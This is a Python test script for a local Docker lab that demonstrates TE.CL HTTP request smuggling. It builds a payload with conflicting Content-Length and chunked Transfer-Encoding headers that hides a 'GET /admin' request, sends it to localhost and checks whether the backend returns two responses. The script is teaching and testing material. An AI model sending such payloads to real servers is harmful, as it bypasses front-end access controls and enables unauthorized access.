#!/usr/bin/env python3
"""
TE.CL Smuggling Test
====================

This test verifies that the TE.CL lab correctly demonstrates HTTP request
smuggling by sending a crafted payload where:

    Frontend (TE): Reads chunked body → sees ONE request.
    Backend  (CL): Reads Content-Length bytes → sees TWO requests.

The smuggled second request appears because:
    1. Frontend decodes the chunked body (reads until 0\r\n\r\n).
    2. Frontend forwards the decoded body + original headers to backend.
    3. Backend uses Content-Length to determine body length.
    4. Content-Length is smaller than the decoded body.
    5. Remaining bytes become a new request.

Usage:
    python tests/test_te_cl.py

Requires the lab to be running: docker compose up --build
"""

import socket
import time
import sys


def test_te_cl_smuggling():
    """
    TE.CL Smuggling Test

    Payload structure (sent to frontend):
        POST / HTTP/1.1\r\n
        Host: localhost:8081\r\n
        Content-Length: 4\r\n              ← Backend will use this (reads only 4 bytes)
        Transfer-Encoding: chunked\r\n    ← Frontend uses this (decodes chunks)
        \r\n
        2e\r\n                             ← Chunk: 0x2e = 46 bytes
        GET /admin HTTP/1.1\r\n            ← These 46 bytes include the smuggled request
        Host: localhost:8081\r\n
        \r\n
        \r\n                               ← End of chunk data
        0\r\n                              ← Terminal chunk
        \r\n                               ← End of chunked encoding

    What happens:
    1. Frontend reads chunked body:
       - Chunk 1: 0x2e bytes = "GET /admin HTTP/1.1\r\nHost: localhost:8081\r\n\r\n"
       - Terminal chunk: 0
       - Decoded body = "GET /admin HTTP/1.1\r\nHost: localhost:8081\r\n\r\n"
    2. Frontend forwards to backend: headers (with Content-Length: 4) + decoded body
    3. Backend reads Content-Length: 4 bytes = "GET " (or first 4 bytes of decoded body)
    4. Backend sees remaining bytes as a new HTTP request starting with "/admin HTTP/1.1\r\n..."

    Actually, let's use a cleaner approach where Content-Length covers a small
    prefix and the rest becomes the smuggled request.
    """

    # The smuggled request embedded in the chunked body
    smuggled_request = b"GET /admin HTTP/1.1\r\nHost: localhost:8081\r\n\r\n"

    # The "legitimate" body prefix that Content-Length will cover
    legitimate_body = b"xx\r\n"  # 4 bytes that Content-Length will claim

    # The chunk data = legitimate body + smuggled request
    chunk_data = legitimate_body + smuggled_request

    # Chunk size in hex
    chunk_size_hex = format(len(chunk_data), "x").encode()

    # Build the complete payload with chunked encoding
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8081\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        + chunk_size_hex + b"\r\n"
        + chunk_data + b"\r\n"
        b"0\r\n"
        b"\r\n"
    )

    print("=" * 60)
    print("TE.CL SMUGGLING TEST")
    print("=" * 60)
    print()
    print(f"Payload ({len(payload)} bytes):")
    print(f"  {payload!r}")
    print()
    print(f"Content-Length (backend uses): 4")
    print(f"Chunk data ({len(chunk_data)} bytes): {chunk_data!r}")
    print(f"Legitimate body (4 bytes): {legitimate_body!r}")
    print(f"Smuggled request: {smuggled_request!r}")
    print()

    # Connect and send
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)

    try:
        sock.connect(("127.0.0.1", 8081))
        print("Connected to 127.0.0.1:8081")
    except ConnectionRefusedError:
        print("FAIL: Cannot connect to 127.0.0.1:8081")
        print("Make sure the lab is running: docker compose up --build")
        sys.exit(1)

    sock.sendall(payload)
    print(f"Sent {len(payload)} bytes")
    print()

    # Collect responses
    responses = b""
    deadline = time.time() + 5.0

    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            responses += chunk
            if responses.count(b"HTTP/1.1") >= 2:
                time.sleep(0.5)
                try:
                    extra = sock.recv(4096)
                    if extra:
                        responses += extra
                except socket.timeout:
                    pass
                break
        except socket.timeout:
            if responses:
                break
            continue

    sock.close()

    print("=" * 60)
    print("RESPONSES RECEIVED")
    print("=" * 60)
    print()
    print(responses.decode("utf-8", errors="replace"))
    print()

    # Verify
    response_count = responses.count(b"HTTP/1.1")
    print("=" * 60)
    print("VERIFICATION")
    print("=" * 60)
    print()
    print(f"Number of HTTP responses received: {response_count}")

    if response_count >= 2:
        print("[PASS] Backend processed the smuggled request!")
        print("       The frontend saw ONE request (chunked encoding).")
        print("       The backend saw TWO requests (Content-Length was smaller")
        print("       than decoded body, remaining bytes became a second request).")

        if b"ADMIN AREA" in responses:
            print("       [PASS] Smuggled request reached /admin endpoint!")
        else:
            print("       [INFO] Smuggled request was processed but /admin response not found.")
            print("              Check docker compose logs for backend output.")

        return True
    else:
        print("[FAIL] Expected 2+ responses, got", response_count)
        print("       The smuggling did not work as expected.")
        print("   Check docker compose logs for debugging:")
        print("     docker compose logs te-cl-frontend")
        print("     docker compose logs te-cl-backend")
        return False


if __name__ == "__main__":
    success = test_te_cl_smuggling()
    sys.exit(0 if success else 1)
